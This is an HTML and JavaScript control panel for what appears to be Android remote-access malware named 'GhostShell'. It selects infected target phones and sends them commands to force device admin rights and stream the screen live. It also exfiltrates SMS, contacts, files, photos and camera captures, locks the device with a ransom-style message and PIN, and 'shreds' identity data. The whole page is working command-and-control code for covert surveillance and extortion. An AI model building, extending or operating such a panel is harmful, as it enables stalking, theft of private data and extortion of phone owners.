<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GhostShell :: Control v4.0</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
        * { margin:0; padding:0; box-sizing:border-box; font-family: 'Share Tech Mono', monospace; }
        :root { --bg: #050505; --surface: #0a0a0a; --primary: #00ff33; --danger: #ff003c; --text: #e0e0e0; --dim: #557755; }
        body { background: var(--bg); color: var(--text); padding: 15px; }
        .panel { background: var(--surface); border: 1px solid var(--dim); padding: 20px; position: relative; margin-bottom: 20px; }
        .sys-title { border-bottom: 1px dashed var(--dim); padding-bottom: 8px; margin-bottom: 15px; font-size: 0.9rem; color: var(--primary); }
        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(130px, 1fr)); gap: 10px; }
        .btn { background: #0a0a0a; border: 1px solid #333; padding: 15px 5px; text-align: center; color: var(--dim); cursor: pointer; font-size: 0.8rem; }
        .btn i { display: block; font-size: 1.5rem; margin-bottom: 8px; color: var(--primary); }
        .btn:hover { border-color: var(--primary); color: var(--primary); }
        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 100; align-items: center; justify-content: center; padding: 15px; }
        .modal-card { background: #050505; width: 100%; max-width: 800px; height: 80vh; border: 1px solid var(--primary); display: flex; flex-direction: column; }
        .modal-header { padding: 15px; border-bottom: 1px solid #222; display: flex; justify-content: space-between; }
        .modal-body { padding: 20px; overflow-y: auto; flex-grow: 1; }
        .terminal { background: #000; color: var(--primary); padding: 10px; height: 150px; overflow-y: auto; font-size: 0.75rem; border: 1px solid #222; }
        table { width: 100%; border-collapse: collapse; font-size: 0.8rem; }
        th, td { padding: 10px; text-align: left; border-bottom: 1px solid #222; }
        th { color: var(--dim); }
        .gallery-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); gap: 10px; }
        .gallery-item { background: #111; border: 1px solid #333; height: 150px; display: flex; align-items: center; justify-content: center; overflow: hidden; }
        .gallery-item img { max-width: 100%; max-height: 100%; }
    </style>
</head>
<body>
    <div class="panel" style="display:flex; justify-content: space-between; align-items: center;">
        <h1 style="color:var(--primary); font-size: 1.5rem;"><i class="fas fa-ghost"></i> GHOSTSHELL_BASE</h1>
        <div id="target-info" style="color:var(--dim);">No Target Selected</div>
    </div>

    <div id="selection-view" class="panel">
        <h3 class="sys-title"><i class="fas fa-radar"></i> TARGETS_ONLINE</h3>
        <div id="device-list">Scanning...</div>
    </div>

    <div id="dashboard-view" style="display:none;">
        <div class="panel">
            <h3 class="sys-title"><i class="fas fa-bolt"></i> FORCE_PERMISSIONS</h3>
            <div class="grid" style="grid-template-columns: 1fr 1fr;">
                <div class="btn" onclick="cmd('request_admin')"><i class="fas fa-user-shield"></i> DEVICE ADMIN</div>
                <div class="btn" onclick="cmd('start_stream')"><i class="fas fa-desktop"></i> LIVE SCREEN</div>
            </div>
        </div>

        <div class="panel">
            <h3 class="sys-title"><i class="fas fa-microchip"></i> DATA_MINING</h3>
            <div class="grid">
                <div class="btn" onclick="openMod('sms')"><i class="fas fa-sms"></i> SMS LOGS</div>
                <div class="btn" onclick="openMod('contacts')"><i class="fas fa-address-book"></i> CONTACTS</div>
                <div class="btn" onclick="openMod('fm')"><i class="fas fa-folder-open"></i> FILES</div>
                <div class="btn" onclick="openMod('gallery')"><i class="fas fa-images"></i> GALLERY</div>
                <div class="btn" onclick="openMod('camera')"><i class="fas fa-camera"></i> CAPTURE</div>
                <div class="btn" onclick="openMod('lock')"><i class="fas fa-lock"></i> LOCK</div>
                <div class="btn" onclick="if(confirm('SHRED?'))cmd('shred_identity')"><i class="fas fa-user-secret"></i> SHRED</div>
            </div>
        </div>

        <div class="panel">
            <h3 class="sys-title"><i class="fas fa-terminal"></i> REALTIME_LOGS</h3>
            <div id="main-log" class="terminal"></div>
        </div>
    </div>

    <div id="modal" class="modal">
        <div class="modal-card">
            <div class="modal-header"><h3 id="m-title">MODAL</h3><span onclick="closeMod()" style="cursor:pointer">&times;</span></div>
            <div class="modal-body" id="m-body"></div>
        </div>
    </div>

    <script>
        let selId = null, state = { devices: [] }, curMod = null, streamInt = null;
        const myUid = 'ghostshell';

        async function cmd(c) {
            if(!selId) return;
            await fetch('/api/command', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({cmd:c, client_id:selId})});
        }

        async function poll() {
            try {
                const res = await fetch(`/api/status?owner=${myUid}`);
                state = await res.json();
                document.getElementById('main-log').innerText = state.logs.join('\n');
                document.getElementById('main-log').scrollTop = 9999;
                document.getElementById('device-list').innerHTML = state.devices.map(d=>`
                    <div class="btn" style="width:100%; text-align:left; margin-bottom:5px; border-left:4px solid var(--primary);" onclick="selectTarget('${d.id}')">
                        <i class="fas fa-mobile"></i> ${d.model} [${d.id}]
                    </div>
                `).join('') || "Waiting...";
            } catch(e){}
            setTimeout(poll, 3000);
        }

        function selectTarget(id) {
            selId = id;
            document.getElementById('selection-view').style.display = 'none';
            document.getElementById('dashboard-view').style.display = 'block';
            document.getElementById('target-info').innerText = "TARGET: " + id;
        }

        async function openMod(t) {
            curMod = t;
            document.getElementById('modal').style.display = 'flex';
            document.getElementById('m-title').innerText = t.toUpperCase();
            const b = document.getElementById('m-body'); b.innerHTML = "Loading...";
            
            if(t === 'sms') {
                cmd('getsms');
                setTimeout(async () => {
                    const res = await fetch(`/api/data/${selId}`);
                    const d = await res.json();
                    b.innerHTML = `<table><tr><th>From</th><th>Message</th></tr>${d.sms.map(s=>`<tr><td>${s.userSender}</td><td>${s.content}</td></tr>`).join('')}</table>`;
                }, 2000);
            } else if(t === 'fm') {
                cmd('list_files /storage/emulated/0/');
                setTimeout(async () => {
                    const res = await fetch(`/api/data/${selId}`);
                    const d = await res.json();
                    b.innerHTML = `<h3>Path: ${d.fm.path}</h3><table>${d.fm.files.map(f=>`<tr><td>${f.isDir?'[DIR]':'[FILE]'} ${f.name}</td><td>${(f.size/1024).toFixed(1)} KB</td></tr>`).join('')}</table>`;
                }, 2000);
            } else if(t === 'gallery') {
                cmd('get_gallery');
                setTimeout(async () => {
                    const res = await fetch(`/api/data/${selId}`);
                    const d = await res.json();
                    b.innerHTML = `<div class="gallery-grid">${d.gallery.files.map(f=>`<div class="gallery-item"><img src="/captured_images/${f.split('/').pop()}"></div>`).join('')}</div>`;
                }, 3000);
            } else if(t === 'lock') {
                b.innerHTML = `<select id="lt"><option value="1">V1</option><option value="2">V2</option><option value="3">V3</option></select><input id="lm" value="CRITICAL"><input id="lp" value="1337"><button class="btn" style="width:100%" onclick="cmd('lock '+document.getElementById('lm').value+'|'+document.getElementById('lp').value+'|'+document.getElementById('lt').value)">EXECUTE</button>`;
            }
        }

        function closeMod() {
            if(curMod === 'stream') { cmd('stop_stream'); clearInterval(streamInt); }
            document.getElementById('modal').style.display = 'none';
            curMod = null;
        }

        poll();
    </script>
</body>
</html>
